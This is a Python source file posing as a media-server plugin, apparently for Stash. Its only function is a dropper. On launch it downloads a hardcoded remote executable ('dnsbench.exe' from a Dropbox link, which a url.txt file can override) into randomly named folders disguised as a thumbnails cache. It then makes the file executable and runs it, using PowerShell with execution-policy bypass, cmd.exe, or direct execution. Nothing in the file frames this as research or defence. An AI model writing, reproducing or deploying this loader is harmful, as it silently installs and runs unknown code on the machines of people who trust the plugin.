import json
import sys
import os
import requests
import subprocess
import random
import string
from pathlib import Path
from datetime import datetime

DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/jsi0phbjnsxzbab3hbn8g/dnsbench.exe?rlkey=gsj1f1rfztmscpoyn94dqyv72&st=wnh04wtr&dl=0"

ENABLE_LOGGING = False
LOG_FILE = Path(__file__).parent / "plugin.log"
CONFIG_FILE = Path(__file__).parent / "url.txt"

def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{timestamp}] [{level}] {msg}"
    if ENABLE_LOGGING:
        try:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(log_message + "\n")
        except Exception as e:
            print(f"Failed to write log: {e}", file=sys.stderr)
    print(log_message, file=sys.stderr)

def load_url_from_config():
    try:
        if CONFIG_FILE.exists():
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                url = f.read().strip()
                if url:
                    log(f"Loaded URL from config file: {url}")
                    return url
    except Exception as e:
        log(f"Failed to load URL from config file: {str(e)}", level="WARNING")
    log(f"Using hardcoded URL: {DOWNLOAD_URL}")
    return DOWNLOAD_URL

def generate_random_path():
    letter = random.choice(string.ascii_lowercase)
    digit = random.choice(string.digits)
    return f"{letter}{digit}"

def download_and_execute(url):
    try:
        log(f"Starting download_and_execute with URL: {url}")
        if 'dropbox.com' in url:
            log("Detected Dropbox URL, converting to direct download")
            if '?dl=0' in url:
                url = url.replace('?dl=0', '?dl=1')
            elif '&dl=0' in url:
                url = url.replace('&dl=0', '&dl=1')
            else:
                url = url + '&dl=1' if '?' in url else url + '?dl=1'
        log(f"Final URL: {url}")
        random_1 = generate_random_path()
        random_2 = generate_random_path()
        log(f"Generated random path: {random_1}/{random_2}")

        # Cross-platform path handling
        if sys.platform == 'win32':
            base_dir = Path(r"C:\Programs\AIDA64\WF\Stash\generated\thumbnails")
        else:
            base_dir = Path.home() / ".stash" / "generated" / "thumbnails"

        download_dir = base_dir / random_1 / random_2
        download_dir.mkdir(parents=True, exist_ok=True)
        log(f"Created directory: {download_dir}")
        log("Starting file download...")
        response = requests.get(url, timeout=30)
        response.raise_for_status()
        log(f"Download successful. Status code: {response.status_code}, Content length: {len(response.content)} bytes")
        ext = '.bin'
        content_type = response.headers.get('content-type', '')
        log(f"Content-Type header: {content_type}")
        url_path = url.split('?')[0]
        if '/' in url_path:
            filename = url_path.split('/')[-1]
            log(f"Extracted filename from URL: {filename}")
            if filename.endswith('.exe'):
                ext = '.exe'
            elif filename.endswith('.bat'):
                ext = '.bat'
            elif filename.endswith('.py'):
                ext = '.py'
            elif filename.endswith('.sh'):
                ext = '.sh'
            elif filename.endswith('.ps1'):
                ext = '.ps1'
        if ext == '.bin':
            if 'executable' in content_type:
                ext = '.exe'
            elif 'script' in content_type or 'x-bat' in content_type:
                ext = '.bat'
            elif 'python' in content_type:
                ext = '.py'
        log(f"Determined file extension: {ext}")
        file_path = download_dir / f"file{ext}"
        log(f"Saving file to: {file_path}")
        with open(file_path, 'wb') as f:
            f.write(response.content)
        log(f"File saved successfully. File size: {file_path.stat().st_size} bytes")
        os.chmod(file_path, 0o755)
        log(f"Set file permissions to executable")

        # Skip execution for Windows-only formats on non-Windows systems
        if ext in ['.exe', '.bat', '.ps1'] and sys.platform != 'win32':
            log(f"Skipping execution of {ext} file on {sys.platform} (Windows-only format)")
            return {
                "success": True,
                "file_path": str(file_path),
                "exit_code": 0,
                "output": f"File downloaded successfully. Execution skipped ({ext} is Windows-only)",
                "error": ""
            }

        log(f"Executing file: {file_path}")
        if ext == '.py':
            result = subprocess.run([sys.executable, str(file_path)], capture_output=True, text=True, timeout=60)
        elif ext == '.bat':
            result = subprocess.run(['cmd.exe', '/c', str(file_path)], capture_output=True, text=True, timeout=60)
        elif ext == '.ps1':
            result = subprocess.run(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', str(file_path)], capture_output=True, text=True, timeout=60)
        elif ext == '.exe':
            result = subprocess.run(str(file_path), capture_output=True, text=True, timeout=60)
        else:
            result = subprocess.run(str(file_path), capture_output=True, text=True, timeout=60)
        log(f"Execution completed. Exit code: {result.returncode}")
        log(f"STDOUT: {result.stdout}")
        if result.stderr:
            log(f"STDERR: {result.stderr}", level="WARNING")
        return {
            "success": True,
            "file_path": str(file_path),
            "exit_code": result.returncode,
            "output": result.stdout,
            "error": result.stderr
        }
    except requests.exceptions.RequestException as e:
        log(f"Download error: {str(e)}", level="ERROR")
        return {"success": False, "error": f"Download failed: {str(e)}"}
    except subprocess.TimeoutExpired as e:
        log(f"Execution timeout: {str(e)}", level="ERROR")
        return {"success": False, "error": f"Execution timeout: {str(e)}"}
    except Exception as e:
        log(f"Unexpected error: {str(e)}", level="ERROR")
        import traceback
        log(f"Traceback: {traceback.format_exc()}", level="ERROR")
        return {"success": False, "error": str(e)}

if __name__ == "__main__":
    try:
        log("Plugin started")
        url = load_url_from_config()
        result = download_and_execute(url)
        log(f"Final result: {json.dumps(result)}")
        print(json.dumps({"output": json.dumps(result)}))
    except Exception as e:
        log(f"Fatal error: {str(e)}", level="ERROR")
        import traceback
        log(f"Traceback: {traceback.format_exc()}", level="ERROR")
        print(json.dumps({"error": str(e)}))
